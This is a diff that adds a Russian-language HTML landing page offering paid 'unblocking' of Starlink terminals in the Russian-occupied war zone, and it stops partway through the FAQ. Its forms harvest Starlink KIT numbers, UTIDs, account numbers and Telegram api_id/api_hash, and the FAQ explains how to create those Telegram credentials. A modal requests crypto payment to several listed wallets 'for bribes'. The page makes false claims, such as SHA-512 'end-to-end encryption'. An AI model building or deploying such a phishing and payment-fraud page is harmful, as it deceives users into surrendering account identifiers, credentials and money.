@@ -1,0 +1,841 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>СВОбодный Старлинк</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;800&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <!-- Custom Config for extended blur and opacity -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        display: ['Exo 2', 'sans-serif'],
+                    },
+                    backgroundImage: {
+                        'space': "url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?q=80&w=2072&auto=format&fit=crop')",
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f0f0f;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #444;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #666;
+        }
+
+        /* Glassmorphism Utilities */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+        }
+
+        .glass-panel:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        /* Button Hover Effect */
+        .btn-glass {
+            background: transparent;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            transition: all 0.3s ease;
+        }
+        .btn-glass:hover {
+            background: white;
+            color: black;
+            border-color: white;
+        }
+
+        /* FAQ Animation */
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out, opacity 0.4s ease;
+            opacity: 0;
+        }
+        .faq-item.active .faq-answer {
+            max-height: 200px; /* Adjust based on content */
+            opacity: 1;
+            margin-top: 1rem;
+        }
+        .faq-icon {
+            transition: transform 0.3s ease;
+        }
+        .faq-item.active .faq-icon {
+            transform: rotate(180deg);
+        }
+
+        /* Fade In Animation */
+        .fade-in-up {
+            animation: fadeInUp 1s ease-out forwards;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .delay-100 { animation-delay: 0.1s; }
+        .delay-200 { animation-delay: 0.2s; }
+        .delay-300 { animation-delay: 0.3s; }
+    </style>
+</head>
+<body class="bg-space bg-cover bg-fixed bg-center bg-no-repeat min-h-screen selection:bg-white selection:text-black">
+
+    <!-- CONSENT MODAL POPUP -->
+    <div id="consent-modal" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-md px-4 transition-opacity duration-500">
+        <div class="glass-panel max-w-md w-full p-8 rounded-2xl border border-white/20 shadow-2xl flex flex-col items-center text-center transform scale-100 transition-transform duration-300">
+            <h2 class="text-2xl font-display font-bold uppercase mb-4 tracking-wider text-white">Внимание!</h2>
+            <p class="text-gray-300 text-sm mb-8 leading-relaxed">
+                Никогда не сообщайте координаты размещения свои терминалов Starlink. Эта информация НЕ нужна для разблокировки.<br>Настоятельно рекомендуем воздержаться от использования терминалов Starlink до завершения процеса добавления в "Белый список".
+            </p>
+
+          <!--  <div class="flex items-center gap-3 mb-6 w-full p-3 bg-white/5 rounded-lg border border-white/10 hover:bg-white/10 transition cursor-pointer group" onclick="document.getElementById('consent-check').click()">
+                <div class="relative flex items-center">
+                  <input type="checkbox" id="consent-check" class="peer h-5 w-5 cursor-pointer appearance-none rounded border border-gray-500 bg-gray-700 checked:bg-blue-600 checked:border-blue-600 transition-all" onchange="toggleConsentBtn()">
+                  <svg class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-3.5 h-3.5 pointer-events-none opacity-0 peer-checked:opacity-100 text-white transition-opacity" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                  </svg>
+                </div>
+                <label for="consent-check" class="text-sm cursor-pointer select-none text-gray-300 group-hover:text-white transition">Принимаю условия использования</label>
+            </div> -->
+
+            <button id="consent-btn" onclick="closeModal()" class="w-full py-3 rounded bg-white text-black font-bold uppercase tracking-widest text-sm opacity-40 transition-all duration-300 hover:bg-gray-200 hover:scale-[1.02]">
+                Перейти на Сайт
+            </button>
+        </div>
+    </div>
+
+    <!-- TILE 1 MODAL -->
+    <div id="modal-tile1" style="display: none;" class="fixed inset-0 z-[100] opacity-0 pointer-events-none items-center justify-center bg-black/90 backdrop-blur-md px-4 transition-opacity duration-500">
+        <div class="glass-panel max-w-md w-full p-8 rounded-2xl border border-white/20 shadow-2xl flex flex-col relative max-h-[90vh] overflow-y-auto">
+            <h2 class="text-2xl font-display font-bold uppercase mb-2 text-white">Оформление заявки</h2>
+            <p class="text-gray-300 text-sm mb-6">Пакет "СВОбодный". Введите данные для формирования запроса.</p>
+
+            <form onsubmit="handleTile1Submit(event)" id="form-tile1" class="flex flex-col gap-4">
+                <input name="kit" type="text" placeholder="KIT-номер - KIT00000000" class="w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                <input name="account" type="text" placeholder="Account number на сайте Starlink - ACC-###" class="w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                <input name="utid" type="text" placeholder="UTID - 01000000-00000000-00e1c9f7" required class="tile1-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                <input name="api_id" type="text" placeholder="App api_id - 12345678" required class="tile1-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                <input name="api_hash" type="text" placeholder="App api_hash - cdfа13243189е217b60а7d224е33а8d7" required class="tile1-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+
+                <button type="submit" class="w-full mt-4 py-3 rounded bg-blue-600 text-white font-bold uppercase tracking-widest text-sm transition-all duration-300 hover:bg-blue-500 hover:scale-[1.02]">
+                    Далее
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- TILE 2 MODAL -->
+    <div id="modal-tile2" style="display: none;" class="fixed inset-0 z-[100] opacity-0 pointer-events-none items-center justify-center bg-black/90 backdrop-blur-md px-4 transition-opacity duration-500">
+        <div class="glass-panel max-w-lg w-full p-6 md:p-8 rounded-2xl border border-white/20 shadow-2xl flex flex-col relative max-h-[90vh]">
+
+            <div class="mb-4 pr-6">
+                <h2 class="text-2xl font-display font-bold uppercase mb-2 text-white">Оформление заявки</h2>
+                <p class="text-gray-300 text-sm">Пакет "СВОбодный". Введите данные для формирования запроса.</p>
+            </div>
+
+            <form onsubmit="handleTile2Submit(event)" id="form-tile2" class="flex flex-col flex-1 overflow-hidden">
+                <!-- Scrollable Fields Area -->
+                <div id="tile2-blocks-container" class="flex flex-col gap-4 overflow-y-auto pr-2 pb-2" style="scrollbar-width: thin;">
+                    <!-- Block 1 (Always present) -->
+                    <div class="tile2-block flex flex-col gap-3 p-5 border border-white/10 rounded-xl bg-white/5 relative" data-block-id="1">
+                        <h4 class="text-sm font-semibold text-gray-400 mb-1 block-title">Комплект 1</h4>
+                        <input name="kit" type="text" placeholder="KIT-номер - KIT00000000" class="w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="utid" type="text" placeholder="UTID - 01000000-00000000-00e1c9f7" required class="tile2-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="account" type="text" placeholder="Account number на сайте Starlink - ACC-###" class="w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="api_id" type="text" placeholder="App api_id - 12345678" required class="tile2-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="api_hash" type="text" placeholder="App api_hash - cdfа13243189е217b60а7d224е33а8d7" required class="tile2-auto-trigger w-full bg-white/5 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                    </div>
+                </div>
+
+                <!-- Template for new blocks (Hidden from DOM display) -->
+                <template id="tile2-block-template">
+                    <div class="tile2-block flex flex-col gap-3 p-5 border border-white/10 rounded-xl bg-white/5 relative mt-4">
+                        <div class="flex justify-between items-center mb-1">
+                            <h4 class="text-sm font-semibold text-gray-400 block-number block-title">Комплект X</h4>
+                            <button type="button" onclick="removeBlock(this)" class="text-red-500 hover:text-red-400 p-1 transition-colors" title="Удалить комплект">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                                    <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd" />
+                                </svg>
+                            </button>
+                        </div>
+                        <input name="kit" type="text" placeholder="KIT-номер - KIT00000000" class="w-full bg-black/40 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="utid" type="text" placeholder="UTID - 01000000-00000000-00e1c9f7" required class="tile2-auto-trigger w-full bg-black/40 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="account" type="text" placeholder="Account number на сайте Starlink - ACC-###" class="w-full bg-black/40 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="api_id" type="text" placeholder="App api_id - 12345678" required class="tile2-auto-trigger w-full bg-black/40 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                        <input name="api_hash" type="text" placeholder="App api_hash - cdfа13243189е217b60а7d224е33а8d7" required class="tile2-auto-trigger w-full bg-black/40 border border-white/20 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 transition-colors">
+                    </div>
+                </template>
+
+                <!-- Actions Area (Fixed at bottom of modal) -->
+                <div class="flex flex-col gap-3 mt-6 pt-4 border-t border-white/10 shrink-0">
+                    <button type="button" id="btn-add-more" onclick="addMoreBlocks()" class="w-full py-3 rounded border border-dashed border-gray-500 text-gray-400 font-semibold text-sm transition-all hover:border-white hover:text-white">
+                        Добавить еще один комплект к заявке
+                    </button>
+                    <p id="max-limit-text" class="hidden text-center text-red-400 text-sm mb-1">Максимально можно добавить 10 комплектов в рамках одной заявки</p>
+
+                    <button type="submit" class="w-full py-3 rounded bg-blue-600 text-white font-bold uppercase tracking-widest text-sm transition-all duration-300 hover:bg-blue-500 hover:scale-[1.02]">
+                        Далее
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAYMENT MODAL -->
+    <div id="modal-payment" style="display: none;" class="fixed inset-0 z-[100] opacity-0 pointer-events-none items-center justify-center bg-black/90 backdrop-blur-md px-4 transition-opacity duration-500">
+        <div class="glass-panel max-w-lg w-full p-8 rounded-2xl border border-white/20 shadow-2xl flex flex-col items-center text-center relative">
+            <div class="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mb-6">
+                <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            </div>
+            <h2 class="text-2xl font-display font-bold uppercase mb-2 text-white">Оформление заявки</h2>
+            <p class="text-gray-300 text-sm mb-6 leading-relaxed">
+                Для активации процесса внесения в "Белый список", пожалуйста, оплатите необходимую сумму на указанный криптокошелек.
+            </p>
+
+            <div class="w-full bg-black/50 border border-white/10 rounded-lg p-5 mb-6">
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Сумма к оплате</div>
+                <div id="payment-amount" class="text-3xl font-bold text-white mb-4">50 USD</div>
+
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Адрес кошелька Bitcoin</div>
+                <div class="bg-white/5 border border-white/10 rounded p-3 text-sm font-mono text-blue-300 break-all select-all mb-3">
+                    bc1qxus7jlnwreyju785xc9jvjaea57nykqdyzuj53
+                </div>
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Адрес кошелька USDT (Ethereum)</div>
+                <div class="bg-white/5 border border-white/10 rounded p-3 text-sm font-mono text-blue-300 break-all select-all mb-3">
+                    0x4CA687015927DAC16fe34ea76cc8fa043A449284
+                </div>
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Адрес кошелька Solana</div>
+                <div class="bg-white/5 border border-white/10 rounded p-3 text-sm font-mono text-blue-300 break-all select-all mb-3">
+                    CQ47DdTGpgxamtMrqQcQJynE1dAoYnQBPyr28p1UScA1
+                </div>
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Адрес кошелька Polygon</div>
+                <div class="bg-white/5 border border-white/10 rounded p-3 text-sm font-mono text-blue-300 break-all select-all mb-3">
+                     0x4CA687015927DAC16fe34ea76cc8fa043A449284
+                </div>
+                <div class="text-gray-400 text-xs uppercase tracking-wider mb-1">Адрес кошелька Tron</div>
+                <div class="bg-white/5 border border-white/10 rounded p-3 text-sm font-mono text-blue-300 break-all select-all">
+                    TV2gptvTGEM6ttyRFiWybc1X8aNsfZXhxt
+                </div>
+            </div>
+
+            <button onclick="closeModalPopup('modal-payment')" class="w-full py-4 rounded bg-white text-black font-bold uppercase tracking-widest text-sm transition-all duration-300 hover:bg-gray-200 hover:scale-[1.02] shadow-[0_0_20px_rgba(255,255,255,0.3)]">
+                Подтверждаю оплату
+            </button>
+        </div>
+    </div>
+
+    <!-- Overlay to darken background image -->
+    <div class="fixed inset-0 bg-black/40 pointer-events-none z-0"></div>
+
+    <!-- Navigation (Visual only for header feel) -->
+    <nav class="relative z-50 w-full p-6 flex justify-between items-center glass-panel border-0 border-b border-white/10 !rounded-none !bg-black/20">
+        <div class="text-2xl font-display font-bold tracking-widest uppercase">SVO.LINK</div>
+        </nav>
+
+    <main class="relative z-10 container mx-auto px-4 py-12 md:py-20 flex flex-col gap-24">
+
+        <!-- SECTION 1: HERO -->
+        <section class="text-center max-w-4xl mx-auto fade-in-up">
+            <h1 class="font-display text-5xl md:text-7xl lg:text-8xl font-bold uppercase tracking-wide leading-tight mb-6 drop-shadow-2xl">
+                <span class="text-red-600">С</span><span class="text-blue-600">В</span>О-бодный<br/>Старлинк
+            </h1>
+            <p class="text-lg md:text-xl text-gray-200 font-light max-w-2xl mx-auto leading-relaxed glass-panel p-6 rounded-xl">
+                Восстановление высокоскоростного доступа к Интернет через терминалы Starlink в SVO.
+            </p>
+        </section>
+
+        <!-- SECTION 2: PRODUCT TILES (2 Columns) -->
+        <section class="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-6xl mx-auto">
+
+            <!-- Tile 1 -->
+            <div class="glass-panel p-8 md:p-12 rounded-3xl flex flex-col justify-between h-full fade-in-up delay-100 min-h-[400px]">
+                <div>
+                    <h2 class="font-display text-3xl md:text-4xl font-bold uppercase mb-4 tracking-wider">Пакет "Бесплатный"</h2>
+                    <p class="text-gray-300 mb-8 leading-relaxed">
+                        Восстановление доступа к Интренет через обращение в <a href="https://starlink.com/support/tickets?sourceType=web_link&sourceValue=help_center_landing" class="text-blue-400 hover:text-white transition"><u>Cлужбу поддержки SpaceX</u></a>. Медленный процесс с результатом "50 на 50". Но 100% бесплатный.
+                    </p>
+                </div>
+                <div class="flex flex-col sm:flex-row gap-4 mt-auto">
+                    <button onclick="openModalPopup('modal-tile1')" class="btn-glass px-8 py-3 rounded text-center font-semibold tracking-wide flex-1">ОФОРМИТЬ</button>
+                    <button onclick="scrollToFaq()" class="px-8 py-3 rounded text-center text-gray-300 hover:text-white hover:underline decoration-1 underline-offset-4 flex-1">ИНФОРМАЦИЯ</button>
+                </div>
+            </div>
+
+            <!-- Tile 2 -->
+            <div class="glass-panel p-8 md:p-12 rounded-3xl flex flex-col justify-between h-full fade-in-up delay-200 min-h-[400px]">
+                <div>
+                    <h2 class="font-display text-3xl md:text-4xl font-bold uppercase mb-4 tracking-wider">Пакет "СВОбодный"</h2>
+                    <p class="text-gray-300 mb-8 leading-relaxed">
+                        Уже провереный и действительно рабочий вариант попадания в "Белый список" старлинков юрлиц киевского режима или регистрация на физлиц стран Европы.
+                    </p>
+                </div>
+                <div class="flex flex-col sm:flex-row gap-4 mt-auto">
+                    <button onclick="openModalPopup('modal-tile2')" class="btn-glass px-8 py-3 rounded text-center font-semibold tracking-wide flex-1">ОФОРМИТЬ</button>
+                    <button onclick="scrollToFaq()" class="px-8 py-3 rounded text-center text-gray-300 hover:text-white hover:underline decoration-1 underline-offset-4 flex-1">ИНФОРМАЦИЯ</button>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- SECTION 3: ADVANTAGES (6 Grid Items) -->
+        <section class="max-w-6xl mx-auto w-full">
+            <h3 class="text-2xl font-display uppercase tracking-widest mb-8 text-center md:text-left text-gray-400">Почему СВОбодный Старлинк?</h3>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+
+                <!-- Advantage 1: 100% -->
+                <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-100">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <!-- Icon: 100% -->
+                        <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2">
+                            <text x="50%" y="50%" text-anchor="middle" dy=".3em" font-size="10" font-weight="bold" fill="white" stroke="none">100%</text>
+                            <circle cx="12" cy="12" r="10" stroke-opacity="0.5" />
+                        </svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Проверенные методы</h4>
+                        <p class="text-sm text-gray-300">Мы уже проверили оба варианта разблокировки и каждый показал успешные исходы.</p>
+                    </div>
+                </div>
+
+                <!-- Advantage 2: Money Back -->
+                <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-100">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <!-- Icon: Money & Loop -->
+                        <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5">
+                            <rect x="2" y="6" width="20" height="12" rx="2" stroke="currentColor" />
+                            <circle cx="12" cy="12" r="2" stroke="currentColor" />
+                            <path d="M4 6v-1a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v1" stroke-opacity="0.5" />
+                            <path d="M20 18v1a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-1" stroke-opacity="0.5" />
+                            <path d="M17 4l2.5 2.5l-2.5 2.5" stroke="currentColor" />
+                            <path d="M7 20l-2.5 -2.5l2.5 -2.5" stroke="currentColor" />
+                        </svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Низкие цены</h4>
+                        <p class="text-sm text-gray-300">100% оплаты за Пакет "СВОбодный" идёт на взятки, мы работаем для Вас.</p>
+                    </div>
+                </div>
+
+                <!-- Advantage 3 -->
+                <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-200">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Бессплатная опция</h4>
+                        <p class="text-sm text-gray-300">Бесплатный вариант гарантирует частичный успех разблокировки, но и Вы не рискуете ничем.</p>
+                    </div>
+                </div>
+
+                <!-- Advantage 4 -->
+                <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-200">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Глобальное решение</h4>
+                        <p class="text-sm text-gray-300">Комплексный, всеобъемлющий подход к устранению проблемы от Брянска до Крыма.</p>
+                    </div>
+                </div>
+
+                <!-- Advantage 5 -->
+                <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-300">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Цифровая безопасность</h4>
+                        <p class="text-sm text-gray-300">Все Ваши данные защищены сквозным шифрование новейшим криптографическим протоколом <a href="https://ru.wikipedia.org/wiki/SHA-2" class="text-blue-400 hover:text-white transition"><u>SHA-512</u></a>.</p>
+                    </div>
+                </div>
+
+                 <!-- Advantage 6 -->
+                 <div class="glass-panel p-6 rounded-2xl flex items-start gap-4 fade-in-up delay-300">
+                    <div class="shrink-0 p-3 bg-white/10 rounded-full">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-lg uppercase mb-1">Превентивные меры</h4>
+                        <p class="text-sm text-gray-300">Автоматическое и бессплатное оформиление бронирования от блокировки терминала Starlink в будущем. Мы сами подадим все необходимые документы.</p>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- SECTION 4: FAQ (8 Items) -->
+        <section id="faq-section" class="max-w-3xl mx-auto w-full mb-12">
+            <h3 class="text-2xl font-display uppercase tracking-widest mb-8 text-center text-gray-400">Частые вопросы (FAQ)</h3>
+
+            <div class="flex flex-col gap-4" id="faq-container">
+                <!-- FAQ Item 1 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Должен ли я обязательно оплачивать разблокировку терминала?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">НЕТ. Вы всегда можете воспользоваться бесплатные вариантом. Хотя мы не гарантируем 100% результат, некоторые обращения заканчивались успешными разблокировками.</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 2 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Какие данные необходимо подать для бессплатной разблокировки?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">Для подачи заявки на верификацию терминала киевский режим требует: KIT-номер, UTID, АСС, App api_id и api_hash.</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 3 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Где я могу найти KIT-номер?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">KIT-номер указан на коробке упаковки вашего терминала. По формату: KIT00000000. Не является обязательным для подачи заявки, но повышает шанс успешного исхода.</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 4 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Что такое UTID?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">UTID указывается в приложении Starlink. Если вы недавно загрузили приложение, нажмите "Подключиться к Wi-Fi" и выберите сеть STARLINK. На главном экране приложения Starlink нажмите кнопку "Меню" в верхнем левом углу страницы. Затем прокрутите страницу вниз и нажмите информационный пузырек с буквой "i", чтобы просмотреть сведения об идентификаторе UTID. В разделе "Starlink" найдите идентификатор Starlink/идентификатор терминала. Например: 01000000-00000000-00e1c9f7. Не обращайте внимания на буквы "ut" впереди.</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 5 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Как найти АСС (Account Number)?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">Ваш номер счета (Account Number) указан в личном кабинете на сайте Starlink в разделе «Billing» (Биллинг/Оплата) или в счетах-фактурах (invoices). Формат: ACC-####### (где # - цифры).</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 6 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Как получить App api_id и api_hash?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">Довольно сложний, но важний для валидации процесс следует выполнить согласно <a href="https://core.telegram.org/api/obtaining_api_id" class="text-blue-400 hover:text-white transition"><u>официальной инструкции</u></a> или пошагово: <br>Авторизация: Перейдите на сайт my.telegram.org и авторизируйтесь.
+<br>Создание API: Перейдите в разденл «API development tools».
+<br>Заполнение формы: Введите произвольное название (App title), короткое имя (Short name), URL (любую ссылку - https://yandex.ru), Платформа (Android или iOS).
+<br>Получение данных: После нажатия «Create» или «Save», вы увидите App api_id (как правило 8 цифр) и App api_hash (32 цифро-буквы). </p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 7 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Какая цена разблокировки одного терминала Starlink?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
